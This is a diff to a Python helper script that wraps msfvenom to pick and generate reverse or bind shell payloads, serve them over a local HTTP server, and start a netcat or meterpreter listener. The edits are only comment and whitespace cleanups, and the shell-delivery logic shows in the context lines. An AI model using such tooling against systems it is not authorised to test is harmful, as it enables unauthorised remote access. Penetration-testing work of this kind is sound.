@@ -18,7 +18,6 @@ import sys
 import subprocess
 import os
 
-
 def parse_options():
 
     parser = argparse.ArgumentParser(formatter_class=argparse.RawDescriptionHelpFormatter, \
@@ -52,7 +51,7 @@ Full control:
     parser.add_argument("-s", "--stageless", help="Stageless : if specified -> stageless payload", action ='store_true')
     parser.add_argument("-ip", type=str, help="Local Host if Rev shell, Remote Host if Bind Shell")
     parser.add_argument("-p", "--port", type=int, help="Port to connect to")
-    parser.add_argument("-k", "--keyword", type=str, help="Search by special keyword (android, Hidden...)")
+    parser.add_argument("-k", "--keyword", type=str, help="Search by special keyword (android, hidden...)")
     parser.add_argument("--update", help="Update Payload list",action ='store_true')
         
     args = parser.parse_args()
@@ -63,6 +62,7 @@ Full control:
 
 def Green(text):
     return "\033[32m{}\033[0m".format(text)
+
 def Orange(text):
     return "\033[33m{}\033[0m".format(text)
 
@@ -108,7 +108,7 @@ def print_available_payloads(keywords,payload_list):
                 # Broaden search by removing BIND and STAGED items
                 keywords = keywords.replace('bind','').replace('staged','').strip()
                 print(Green("Searching again with : "),  keywords)
-                #test again for results
+                # Test again for results
                 return print_available_payloads(keywords,payload_list)
                 
 
@@ -119,15 +119,15 @@ def generate_payload(params,number,avail_payloads):
     payload_cmd =avail_payloads[number].split()[0]
     
     # If we have broadened the search :
-    # reverse payload could have been chosen instead of the original bind one
+    # Reverse payload could have been chosen instead of the original bind one
     # Stageless payload could also have been chosen instead of original staged one
     if "reverse" in payload_cmd :
         K_BIND="reverse" # We need to DOUBLE CHECK and force option for correct LHOST/RHOST
     HOST = "LHOST" if K_BIND == "reverse" else "RHOST" 
     K_STAGE = "staged" if "staged" in payload_cmd else ""
     
-    pname = " ".join([K_TYPE, K_ARCH,K_MET, K_BIND,K_STAGE,IP,str(PORT)]).replace(" ","-") # pretify pname
-    pname = "_" + pname # fast trick to remove all payload in dir via rm _*
+    pname = " ".join([K_TYPE, K_ARCH,K_MET, K_BIND,K_STAGE,IP,str(PORT)]).replace(" ","-") # Pretify pname
+    pname = "_" + pname # Fast trick to remove all payloads later in dir via rm _*
     
     if any([cmd in payload_cmd for cmd in ["aix","apple_ios","bsd","cmd/","vbs","python","powershell", "android", "perl","ruby","solaris"]]):
         K_TYPE=""
@@ -159,7 +159,7 @@ def generate_payload(params,number,avail_payloads):
     
     # Deliver payload
     if K_BIND=="bind" :
-        os.system('python3 -m http.server 8082') # not the most elegant but very short        
+        os.system('python3 -m http.server 8082') # Not the most elegant but very short        
     else:
     # For reverse shell
         if 'meterpreter' in payload : # meterpreter shells
@@ -185,7 +185,6 @@ def generate_payload(params,number,avail_payloads):
             msf_cmd = "nc -nlvp {}".format(PORT)
             subprocess.call("qterminal -e '{}' > /dev/null 2>&1 &".format(msf_cmd), shell= True)
 
-            
     return 
 
 
@@ -200,7 +199,7 @@ if __name__ == "__main__":
     
     payload_list = make_payload_list('venom-payloads.txt')
     
-    # extract keywords from command line for later search 
+    # Extract keywords from command line for later search 
     switch_type = {
     "win" : "windows",
     "lin" : "linux",
@@ -234,7 +233,7 @@ if __name__ == "__main__":
                 K_TYPE = "windows"
         
     K_KEY= args.keyword if args.keyword else ""	
-    #Get Architecture 
+    # Get Architecture 
     # Warning: in MSFvenom, when OS = Windows, x86 keyword is never displayed
     # With other payloads like android, we should relax the default x86 arg othrwise we'll found nothing
     if (K_TYPE == "windows" and args.arch=="x86") or (K_KEY):
